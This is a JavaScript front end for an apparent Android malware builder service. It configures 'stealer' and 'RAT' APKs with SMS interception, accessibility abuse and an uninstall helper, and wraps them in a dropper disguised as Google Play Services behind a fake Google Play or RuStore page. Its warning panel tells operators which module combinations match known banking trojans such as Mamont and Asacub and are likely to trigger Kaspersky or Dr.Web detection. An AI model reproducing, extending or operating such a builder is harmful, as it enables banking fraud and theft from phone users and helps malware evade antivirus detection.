'use strict';
function isUrlSafe(raw) {
  if (!raw || !raw.trim()) return false;
  let str = raw.trim();
  if (!/^https?:\/\//.test(str)) return false;
  let url;
  try { url = new URL(str); } catch (_) { return false; }
  const proto = url.protocol;
  if (proto !== 'http:' && proto !== 'https:') return false;
  const h = url.hostname.toLowerCase().replace(/^\[|\]$/g, ''); 
  if (!h) return false;
  if (h === 'localhost' || h === '0.0.0.0' || h === '::1') return false;
  if (/^127\./.test(h) || /^10\./.test(h) || /^169\.254\./.test(h)) return false;
  if (/^192\.168\./.test(h)) return false;
  if (/^172\.(1[6-9]|2[0-9]|3[0-1])\./.test(h)) return false;
  if (h.endsWith('.local') || h.endsWith('.localhost') || h.endsWith('.test') || h.endsWith('.internal')) return false;
  if (h === '169.254.169.254' || h === 'metadata.google.internal') return false;
  if (/^\d+$/.test(h.replace(/\./g, ''))) {
    return false;
  }
  return true;
}
function setFieldError(id, msg) {
  const el = document.getElementById(id);
  if (!el) return;
  const inp = el.previousElementSibling;
  if (msg) {
    el.textContent = msg;
    el.style.display = '';
    if (inp && inp.classList.contains('finput')) inp.classList.add('is-error');
  } else {
    el.textContent = '';
    el.style.display = 'none';
    if (inp && inp.classList.contains('finput')) inp.classList.remove('is-error');
  }
}
function validateForm() {
  const project = state.project;
  const prefix        = (document.getElementById('prefix')?.value || '').trim();
  const dropperName   = (document.getElementById('dropperAppName')?.value || '').trim();
  const targetUrl     = (document.getElementById('targetUrl')?.value || '').trim();
  const dropperUrl    = (document.getElementById('dropperUrl')?.value || '').trim();
  let valid = true;
  if (!/^\d{6}$/.test(prefix)) {
    setFieldError('prefixError', prefix.length === 0 ? 'Обязательное поле' : 'Ровно 6 цифр, только числа');
    valid = false;
  } else {
    setFieldError('prefixError', null);
  }
  if (!dropperName) {
    setFieldError('dropperNameError', 'Обязательное поле');
    valid = false;
  } else {
    setFieldError('dropperNameError', null);
  }
  if (project === 'v2') {
    if (!targetUrl) {
      setFieldError('targetUrlError', 'Обязательное поле для Lite');
      valid = false;
    } else if (!isUrlSafe(targetUrl)) {
      setFieldError('targetUrlError', 'Недопустимый или локальный URL');
      valid = false;
    } else {
      setFieldError('targetUrlError', null);
    }
  } else {
    setFieldError('targetUrlError', null);
  }
  if (!dropperUrl) {
    setFieldError('dropperUrlError', 'Обязательное поле');
    valid = false;
  } else if (!isUrlSafe(dropperUrl)) {
    setFieldError('dropperUrlError', 'Недопустимый или локальный URL');
    valid = false;
  } else {
    setFieldError('dropperUrlError', null);
  }
  if (!state.iconId) {
    setFieldError('iconError', 'Загрузите иконку APK');
    valid = false;
  } else {
    setFieldError('iconError', null);
  }
  if (!state.building) {
    const btn = document.getElementById('buildBtn');
    if (btn) btn.disabled = !valid;
  }
  return valid;
}
function scalePreviewFrame() {
  const frame = document.getElementById('previewBgFrame');
  const parent = frame && frame.parentElement;
  if (!parent) return;
  const pw = parent.clientWidth;
  const ph = parent.clientHeight;
  if (!pw || !ph) return;
  const scale = pw / 390;
  const scaledH = Math.ceil(ph / scale);
  frame.style.cssText = [
    'flex:none',
    'width:390px',
    `height:${scaledH}px`,
    `transform:scale(${scale.toFixed(4)})`,
    'transform-origin:top left',
    'border:none',
    'display:block',
    'pointer-events:none',
    'background:#fff',
  ].join(';');
}
function setupValidation() {
  ['prefix', 'targetUrl', 'dropperAppName', 'dropperUrl'].forEach(id => {
    const el = document.getElementById(id);
    if (el) el.addEventListener('input', validateForm);
  });
  const prefixEl = document.getElementById('prefix');
  if (prefixEl) {
    prefixEl.addEventListener('keypress', e => {
      if (!/\d/.test(e.key) && !['Backspace','Delete','ArrowLeft','ArrowRight','Tab'].includes(e.key)) {
        e.preventDefault();
      }
    });
    prefixEl.addEventListener('input', () => {
      prefixEl.value = prefixEl.value.replace(/\D/g, '').slice(0, 6);
      validateForm();
    });
  }
  const btn = document.getElementById('buildBtn');
  if (btn) btn.disabled = true;
  validateForm();
}
const state = {
  project: 'v2',
  features: {},
  projects: {},
  deps: [],
  activeBuildId: null,
  building: false,
  iconId: null,
  dropperIconId: null,
};
const socket = io();
socket.on('queue:started',  d => { if (d.id === state.activeBuildId) { setStatus('running'); setBuildStatusMsg('running'); } });
socket.on('progress', d => { if (d.id === state.activeBuildId) setProgress(d.pct); });
socket.on('finished', d => {
  if (d.id !== state.activeBuildId) return;
  state.building = false;
  if (d.success) {
    appendLog('\n✅ BUILD SUCCESS');
    setProgress(100);
    showDownloadBtn(d.id);
    setStatus('success');
  } else {
    appendLog('❌ Ошибка сборки');
    setStatus('error');
  }
});
async function boot() {
  const [projData, depsData] = await Promise.all([
    fetch('/api/projects').then(r => r.json()),
    fetch('/api/dependencies').then(r => r.json()),
  ]);
  state.projects = projData;
  state.deps = depsData;
  Object.entries(state.projects).forEach(([proj, p]) => {
    state.features[proj] = {};
    p.features.forEach(f => { state.features[proj][f.key] = f.default !== false; });
  });
  setupProjectTabs();
  renderFeatures(state.project);
  setupControls();
  setupIconUploads();
  setupDropperIconMode();
  setupApkNameMode();
  setupDropperPreview();
  setupValidation();
  requestAnimationFrame(() => { requestAnimationFrame(scalePreviewFrame); });
  window.addEventListener('resize', scalePreviewFrame);
}
function setupProjectTabs() {
  document.querySelectorAll('#projectTabs .tab').forEach(btn => {
    btn.addEventListener('click', () => {
      document.querySelectorAll('#projectTabs .tab').forEach(b => b.classList.remove('active'));
      btn.classList.add('active');
      state.project = btn.dataset.project;
      renderFeatures(state.project);
      document.getElementById('targetUrlRow').style.display = state.project === 'v2' ? '' : 'none';
      document.getElementById('settingsBlockRow').style.display = state.project === 'v3' ? '' : 'none';
      validateForm();
      const vb = document.getElementById('vBadge');
      if (vb) {
        vb.textContent = state.project === 'v2' ? 'ЛАЙТ - СТИЛ' : 'ПОЛНЫЙ - РАТ';
        vb.className = 'vbadge ' + (state.project === 'v2' ? 'vbadge-v2' : 'vbadge-v3');
      }
    });
  });
}
const GROUP_META = {
  common: { label: 'Основные модули',      cls: 'group-common' },
  v3only: { label: 'Расширенные (Full)',   cls: 'group-v3' },
  v2only: { label: 'Lite Only',            cls: 'group-v2' },
};
function getDisabledByDep(project) {
  const disabled = new Set();
  const flags = state.features[project];
  state.deps.forEach(d => {
    if (flags[d.parent] === false) d.children.forEach(c => disabled.add(c));
  });
  return disabled;
}
function renderFeatures(project) {
  const p = state.projects[project];
  if (!p) return;
  const flags = state.features[project];
  const disabledByDep = getDisabledByDep(project);
  const groups = {};
  p.features.forEach(f => { (groups[f.group] = groups[f.group] || []).push(f); });
  const container = document.getElementById('featureGroups');
  container.innerHTML = '';
  Object.entries(groups).forEach(([groupKey, feats]) => {
    const meta = GROUP_META[groupKey] || { label: groupKey, cls: '' };
    const visibleFeats = feats.filter(f => !f.hidden);
    const enabledCount = visibleFeats.filter(f => (f.required || flags[f.key] !== false) && !disabledByDep.has(f.key)).length;
    const groupEl = document.createElement('div');
    groupEl.className = 'feature-group';
    const header = document.createElement('div');
    header.className = 'group-header';
    header.innerHTML = `
      <span class="group-title ${meta.cls}">${meta.label}</span>
      <span class="group-count">${enabledCount}/${visibleFeats.length}</span>
      <span class="group-chevron">▼</span>`;
    groupEl.appendChild(header);
    const list = document.createElement('div');
    list.className = 'feature-list';
    groupEl.appendChild(list);
    header.addEventListener('click', e => {
      if (e.target.closest('.flag-btns')) return;
      const open = list.style.display !== 'none';
      list.style.display = open ? 'none' : '';
      header.querySelector('.group-chevron').textContent = open ? '▶' : '▼';
    });
    feats.forEach(f => {
      if (f.hidden) return;
      const isDep = disabledByDep.has(f.key);
      const isRequired = !!f.required;
      const checked = isRequired || (flags[f.key] !== false && !isDep);
      const disabled = isDep || isRequired;
      const item = document.createElement('label');
      item.className = 'feature-item' + (isDep ? ' dep-disabled' : '') + (isRequired ? ' feat-required' : '');
      const descHtml = f.desc ? `<span class="feat-desc">${f.desc}</span>` : '';
      item.innerHTML = `
        <input type="checkbox" data-key="${f.key}" ${checked ? 'checked' : ''} ${disabled ? 'disabled' : ''}/>
        <span class="feat-name-wrap"><span class="feat-name">${f.label}</span>${descHtml}</span>`;
      list.appendChild(item);
      if (!isRequired) {
        item.querySelector('input').addEventListener('change', e => {
          state.features[project][f.key] = e.target.checked;
          renderFeatures(project);
        });
      }
    });
    container.appendChild(groupEl);
  });
  const comboLines    = []; 
  const comboMedLines = []; 
  const is = k => !disabledByDep.has(k) && flags[k] !== false;
  if (is('feat_sms') && is('feat_turtle'))
    comboLines.push({ label: 'СМС + Пуш увед', perms: ['Паттерн Mamont — банкер №1 СНГ 2024-2026, высокий риск Kaspersky/Dr.Web'], keys: ['feat_sms', 'feat_turtle'] });
  if (is('feat_call_phone') && is('feat_turtle'))
    comboLines.push({ label: 'Звонки + Пуш увед', perms: ['Паттерн мобильного банкера — высокий риск обнаружения'], keys: ['feat_call_phone', 'feat_turtle'] });
  if (!p.isLite) {
    if (is('feat_accessibility') && is('feat_sms'))
      comboMedLines.push({ label: 'Спец.разрешение + СМС', perms: ['Паттерн Asacub (98% заражений РФ) — риск Kaspersky'], keys: ['feat_accessibility', 'feat_sms'] });
    if (is('feat_accessibility') && is('feat_uninstall_helper'))
      comboLines.push({ label: 'Спец.разрешение + Удаление апк', perms: ['Паттерн AV-киллера — критический риск'], keys: ['feat_accessibility', 'feat_uninstall_helper'] });
  }
  const coveredByCombo = new Set();
  [...comboLines, ...comboMedLines].forEach(c => c.keys.forEach(k => coveredByCombo.add(k)));
  const highLines = [];
  const medLines  = [];
  p.features.forEach(f => {
    if (!f.warn || !f.warn.length) return;
    if (coveredByCombo.has(f.key)) return;
    const isDep = disabledByDep.has(f.key);
    const active = (f.required || flags[f.key] !== false) && !isDep;
    if (!active) return;
    const entry = { label: f.label, perms: f.warn };
    if (f.risk === 'high') highLines.push(entry);
    else medLines.push(entry);
  });
  const oldWarn = container.querySelector('.flags-warn-block');
  if (oldWarn) oldWarn.remove();
  const hasAny = comboLines.length || highLines.length || comboMedLines.length || medLines.length;
  if (hasAny) {
    const wb = document.createElement('div');
    wb.className = 'flags-warn-block';
    let html = '';
    if (comboLines.length) {
      html += `<div class="flags-warn-title flags-warn-high">🔴 Опасные комбинации (паттерны банкеров):</div>`;
      html += comboLines.map(w => `<div class="flags-warn-item flags-warn-item-high"><b>${w.label}:</b> ${w.perms.join(', ')}</div>`).join('');
    }
    if (highLines.length) {
      if (comboLines.length) html += `<div class="flags-warn-sep"></div>`;
      html += `<div class="flags-warn-title flags-warn-high">🔴 Точно вызывает триггеры антивирусов:</div>`;
      html += highLines.map(w => `<div class="flags-warn-item flags-warn-item-high"><b>${w.label}:</b> ${w.perms.join(', ')}</div>`).join('');
    }
    if (comboMedLines.length || medLines.length) {
      if (comboLines.length || highLines.length) html += `<div class="flags-warn-sep"></div>`;
      html += `<div class="flags-warn-title flags-warn-med">🟡 Может вызывать триггеры (не факт):</div>`;
      html += [...comboMedLines, ...medLines].map(w => `<div class="flags-warn-item flags-warn-item-med"><b>${w.label}:</b> ${w.perms.join(', ')}</div>`).join('');
    }
    wb.innerHTML = html;
    container.appendChild(wb);
  }
}
function setupDropperIconMode() {
  document.querySelectorAll('input[name="dropperIconMode"]').forEach(r => {
    r.addEventListener('change', () => {
      const custom = document.querySelector('input[name="dropperIconMode"]:checked').value === 'custom';
      document.getElementById('dropperIconRow').style.display = custom ? '' : 'none';
      if (!custom) state.dropperIconId = null;
    });
  });
}
function setupApkNameMode() {
  document.querySelectorAll('input[name="apkNameMode"]').forEach(r => {
    r.addEventListener('change', () => {
      const custom = document.querySelector('input[name="apkNameMode"]:checked').value === 'custom';
      document.getElementById('appNameCustomRow').style.display = custom ? '' : 'none';
    });
  });
}
window.setWbIconId = function(id) { state.iconId = id; };

function setupIconUploads() {
  setupIconField({
    zone: 'iconZone',
    fileInput: 'iconFile',
    selectBtn: 'iconSelectBtn',
    clearBtn: 'iconClearBtn',
    preview: 'iconPreview',
    status: 'iconStatus',
    onUpload: id => {
      state.iconId = id;
      validateForm();
      updatePreviewIcon();
    },
    onClear:  () => {
      state.iconId = null;
      validateForm();
      updatePreviewIcon();
    },
  });
  setupIconField({
    zone: null,
    fileInput: 'dropperIconFile',
    selectBtn: 'dropperIconSelectBtn',
    clearBtn: 'dropperIconClearBtn',
    preview: 'dropperIconThumb',
    status: 'dropperIconStatus',
    onUpload: id => {
      state.dropperIconId = id;
      updatePreviewIcon();
    },
    onClear:  () => {
      state.dropperIconId = null;
      updatePreviewIcon();
    },
  });
}
function setupIconField({ zone, fileInput, selectBtn, clearBtn, preview, status, onUpload, onClear }) {
  const fileEl   = document.getElementById(fileInput);
  const selectEl = document.getElementById(selectBtn);
  const clearEl  = document.getElementById(clearBtn);
  const prevEl   = document.getElementById(preview);
  const statEl   = document.getElementById(status);
  const zoneEl   = zone ? document.getElementById(zone) : null;
  selectEl.addEventListener('click', () => fileEl.click());
  if (zoneEl) {
    zoneEl.addEventListener('dragover', e => { e.preventDefault(); zoneEl.classList.add('drag-over'); });
    zoneEl.addEventListener('dragleave', () => zoneEl.classList.remove('drag-over'));
    zoneEl.addEventListener('drop', e => {
      e.preventDefault();
      zoneEl.classList.remove('drag-over');
      const file = e.dataTransfer.files[0];
      if (file) uploadIcon(file, prevEl, statEl, clearEl, selectEl, onUpload);
    });
  }
  fileEl.addEventListener('change', () => {
    const file = fileEl.files[0];
    if (file) uploadIcon(file, prevEl, statEl, clearEl, selectEl, onUpload);
    fileEl.value = '';
  });
  clearEl.addEventListener('click', () => {
    prevEl.innerHTML = prevEl.dataset.emoji ? `<span>${prevEl.dataset.emoji}</span>` : '<span>📱</span>';
    statEl.textContent = '';
    clearEl.style.display = 'none';
    selectEl.style.display = '';
    onClear();
  });
}
async function uploadIcon(file, prevEl, statEl, clearEl, selectEl, onUpload) {
  statEl.textContent = '⏳ Загрузка...';
  statEl.className = 'upload-status';
  const fd = new FormData();
  fd.append('icon', file);
  try {
    const res = await fetch('/api/upload/icon', { method: 'POST', body: fd });
    const data = await res.json();
    if (!res.ok) throw new Error(data.error || 'Upload failed');
    statEl.textContent = '✅ ' + file.name;
    statEl.className = 'upload-status ok';
    clearEl.style.display = '';
    selectEl.style.display = 'none';
    const reader = new FileReader();
    reader.onload = ev => {
      prevEl.innerHTML = `<img src="${ev.target.result}" alt="icon"/>`;
      updatePreviewIcon();
    };
    reader.readAsDataURL(file);
    onUpload(data.iconId);
  } catch (err) {
    statEl.textContent = '❌ ' + err.message;
    statEl.className = 'upload-status err';
  }
}
function setupDropperPreview() {
  const nameEl  = document.getElementById('dropperAppName');
  const urlEl   = document.getElementById('dropperUrl');
  if (nameEl) nameEl.addEventListener('input', updatePreview);
  if (urlEl)  urlEl.addEventListener('input',  updatePreview);
  document.querySelectorAll('input[name="dropperStore"]').forEach(r => {
    r.addEventListener('change', updatePreviewStore);
  });
  updatePreview();
  updatePreviewStore();
}
function updatePreview() {
  const nameEl      = document.getElementById('dropperAppName');
  const urlEl       = document.getElementById('dropperUrl');
  const previewName = document.getElementById('previewAppName');
  const frame       = document.getElementById('previewBgFrame');
  if (previewName && nameEl) {
    previewName.textContent = nameEl.value || 'Google Play Сервисы';
  }
  if (urlEl) {
    let raw = urlEl.value || '';
    const lo = raw.toLowerCase();
    if (lo.includes('rustore.ru')) {
      const r = document.querySelector('input[name="dropperStore"][value="rustore"]');
      if (r && !r.checked) { r.checked = true; updatePreviewStore(); }
    } else if (lo.includes('play.google.com')) {
      const r = document.querySelector('input[name="dropperStore"][value="google"]');
      if (r && !r.checked) { r.checked = true; updatePreviewStore(); }
    }
    if (frame) {
      if (raw.length > 0) {
        if (!isUrlSafe(raw)) {
          frame.src = 'about:blank';
          frame.removeAttribute('data-proxy-url');
        } else {
          const proxied = '/api/proxy?url=' + encodeURIComponent(raw);
          if (frame.getAttribute('data-proxy-url') !== raw) {
            frame.setAttribute('data-proxy-url', raw);
            frame.src = proxied;
            scalePreviewFrame();
          }
        }
      } else {
        frame.src = 'about:blank';
        frame.removeAttribute('data-proxy-url');
      }
    }
  }
}
function updatePreviewStore() {
  const store      = document.querySelector('input[name="dropperStore"]:checked')?.value || 'google';
  const nameEl     = document.getElementById('previewStoreName');
  const icoGoogle  = document.getElementById('previewStoreIcoGoogle');
  const icoRustore = document.getElementById('previewStoreIcoRustore');
  const bloomSheet = document.getElementById('bloomSheet');
  if (store === 'rustore') {
    if (nameEl)     nameEl.textContent = 'RuStore';
    if (icoGoogle)  icoGoogle.style.display = 'none';
    if (icoRustore) icoRustore.style.display = '';
    if (bloomSheet) bloomSheet.classList.add('rustore');
  } else {
    if (nameEl)     nameEl.textContent = 'Google Play';
    if (icoGoogle)  icoGoogle.style.display = '';
    if (icoRustore) icoRustore.style.display = 'none';
    if (bloomSheet) bloomSheet.classList.remove('rustore');
  }
}
function updatePreviewIcon() {
  const iconMode = document.querySelector('input[name="dropperIconMode"]:checked')?.value || 'same';
  const previewIcon = document.getElementById('previewIcon');
  if (!previewIcon) return;
  let srcImg = null;
  if (iconMode === 'same') {
    srcImg = document.querySelector('#iconPreview img');
  } else {
    srcImg = document.querySelector('#dropperIconThumb img');
  }
  if (srcImg) {
    previewIcon.innerHTML = `<img src="${srcImg.src}" alt="icon"/>`;
  } else {
    previewIcon.innerHTML = '<span>📦</span>';
  }
}
function setupControls() {
  document.getElementById('allOnBtn').addEventListener('click', e => {
    e.stopPropagation();
    state.projects[state.project].features.forEach(f => {
      if (!f.hidden && !f.required) state.features[state.project][f.key] = true;
    });
    renderFeatures(state.project);
  });
  document.getElementById('allOffBtn').addEventListener('click', e => {
    e.stopPropagation();
    state.projects[state.project].features.forEach(f => {
      if (!f.hidden && !f.required) state.features[state.project][f.key] = false;
    });
    renderFeatures(state.project);
  });
  document.getElementById('buildBtn').addEventListener('click', startBuild);
}
async function startBuild() {
  if (state.building) return;
  const project = state.project;
  if (!validateForm()) return;
  const apkNameMode      = document.querySelector('input[name="apkNameMode"]:checked')?.value || 'same';
  const dropperAppNameRaw = document.getElementById('dropperAppName').value.trim() || 'Application';
  const dropperAppNameVal = dropperAppNameRaw.endsWith('.') ? dropperAppNameRaw : dropperAppNameRaw + '.';
  const appNameVal = apkNameMode === 'same'
    ? dropperAppNameRaw
    : (document.getElementById('appNameCustom')?.value.trim() || dropperAppNameRaw);
  const dropperIconMode = document.querySelector('input[name="dropperIconMode"]:checked')?.value || 'same';
  const resolvedDropperIconId = dropperIconMode === 'same' ? state.iconId : state.dropperIconId;
  const payload = {
    project,
    appName:              appNameVal,
    prefix:               document.getElementById('prefix').value.trim() || '000000',
    targetUrl:            document.getElementById('targetUrl').value.trim(),
    smsNumber:            document.getElementById('smsNumber').value.trim(),
    traffer:              document.getElementById('traffer').value.trim(),
    launcherType:         'LEANBACK',
    settingsBlockEnabled: document.querySelector('input[name="settingsBlock"]:checked')?.value !== 'false',
    iconId:               state.iconId || null,
    features:             { ...state.features[project] },
    useDropper:           true,
    dropperType:          'wombat',
    dropperAppName:       dropperAppNameVal,
    dropperUrl:           document.getElementById('dropperUrl').value.trim(),
    dropperStoreIcon:     document.querySelector('input[name="dropperStore"]:checked')?.value || 'google',
    encryptionMode:       document.querySelector('input[name="encryption"]:checked')?.value || 'no',
    dropperIconId:        resolvedDropperIconId || null,
  };
  state.building = true;
  state.activeBuildId = null;
  setStatus('queued');
  setBuildStatusMsg('queue');
  showBuildOverlay(true);
  const card = document.getElementById('progressCard');
  card.style.display = '';
  document.getElementById('buildResult').innerHTML = '';
  const _lb = document.getElementById('logBox'); if (_lb) _lb.innerHTML = '';
  setProgress(0);
  if (window._animateProgressCard) window._animateProgressCard();
  try {
    const res = await fetch('/api/build', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    });
    const data = await res.json();
    if (!res.ok) throw new Error(data.error || 'Build request failed');
    state.activeBuildId = data.id;
    document.getElementById('buildIdLabel').textContent = data.id.slice(0, 8);
    socket.emit('subscribe', { id: data.id });
  } catch (err) {
    state.building = false;
    setBuildStatusMsg('hide');
    showBuildOverlay(false);
    if (err.message === 'build_in_progress') {
      setStatus('error');
      const _el = document.getElementById('buildResult');
      if (_el) _el.innerHTML = '<div class="build-info-warn">⚠️ По этому префиксу уже идёт сборка другим пользователем.<br>Подождите и попробуйте снова.</div>';
    } else {
      setStatus('error');
      appendLog('❌ Ошибка запуска сборки');
    }
  }
}
function showDownloadBtn(buildId) {
  const el = document.getElementById('buildResult');
  el.innerHTML = `
    <a class="btn-download" href="/api/apk/${buildId}" target="_blank">
      ⬇ Скачать APK
    </a>`;
  if (window.gsap) {
    gsap.fromTo(el.querySelector('.btn-download'),
      { opacity: 0, scale: .85, y: 10 },
      { opacity: 1, scale: 1, y: 0, duration: .5, ease: 'back.out(1.4)' }
    );
  }
}
function appendLog(line) {
  const box = document.getElementById('logBox');
  if (!box) return;
  const span = document.createElement('span');
  span.className = classifyLine(line);
  span.textContent = line + '\n';
  box.appendChild(span);
  box.scrollTop = box.scrollHeight;
}
function classifyLine(line) {
  if (/^> Task /.test(line))                 return 'log-task';
  if (/\[ERR\]|error:/i.test(line))          return 'log-error';
  if (/warning:/i.test(line))               return 'log-warn';
  if (/BUILD SUCCESS|✅/.test(line))         return 'log-success';
  if (/BUILD FAILED|❌/.test(line))         return 'log-fail';
  if (/^\[WEBBUILDER\]|^\[BUILD\]/.test(line)) return 'log-dim';
  return 'log-line';
}
function setProgress(pct) {
  document.getElementById('progressBar').style.width  = pct + '%';
  document.getElementById('progressPct').textContent  = pct + '%';
  const phaseEl = document.getElementById('buildPhaseLabel');
  if (phaseEl) {
    let phase = '';
    if (pct <= 0)       phase = '';
    else if (pct < 10)  phase = '🔧 Инициализация...';
    else if (pct < 20)  phase = '📂 Копирование исходников...';
    else if (pct < 30)  phase = '🖼 Подготовка иконок...';
    else if (pct < 85)  phase = '⚙️ Компиляция Gradle... (' + pct + '%)';
    else if (pct < 100) phase = '📦 Финализация APK...';
    else                phase = '✅ Сборка завершена!';
    phaseEl.textContent = phase;
  }
}
function setBuildStatusMsg(type) {
  const el = document.getElementById('buildStatusMsg');
  if (!el) return;
  if (type === 'hide') { el.style.display = 'none'; el.innerHTML = ''; return; }
  el.style.display = '';
  if (type === 'queue') {
    el.className = 'build-status-msg bsm-queue';
    el.innerHTML = '⏳ Задача добавлена в очередь — ожидайте старта. Не закрывайте страницу.';
  } else if (type === 'running') {
    el.className = 'build-status-msg bsm-running';
    el.innerHTML = '⚙️ Сборка запущена — идёт компиляция...';
  }
}
function showBuildOverlay(show) {
  const ov = document.getElementById('buildOverlay');
  if (!ov) return;
  if (show) ov.classList.add('visible');
  else ov.classList.remove('visible');
}
function setStatus(s) {
  const btn     = document.getElementById('buildBtn');
  const txtEl   = document.getElementById('buildBtnText');
  const iconEl  = document.getElementById('buildBtnIcon');
  const MAP = {
    idle:    { text: 'СОБРАТЬ APK',          icon: '🔨' },
    queued:  { text: 'В очереди...',          icon: '⏳' },
    running: { text: 'Сборка...',             icon: '⚙️' },
    success: { text: 'Готово — СОБРАТЬ ЕЩЁ', icon: '✅' },
    error:   { text: 'Ошибка — ПОВТОРИТЬ',   icon: '❌' },
  };
  const entry = MAP[s] || MAP.idle;
  if (txtEl)  txtEl.textContent  = entry.text;
  if (iconEl) iconEl.textContent = entry.icon;
  btn.disabled = (s === 'queued' || s === 'running');
  btn.className = 'btn-build' + (s === 'success' ? ' success' : s === 'error' ? ' error' : '');
  if (s === 'success' || s === 'error') {
    state.building = false;
    setBuildStatusMsg('hide');
    showBuildOverlay(false);
    validateForm(); 
  }
}

boot();
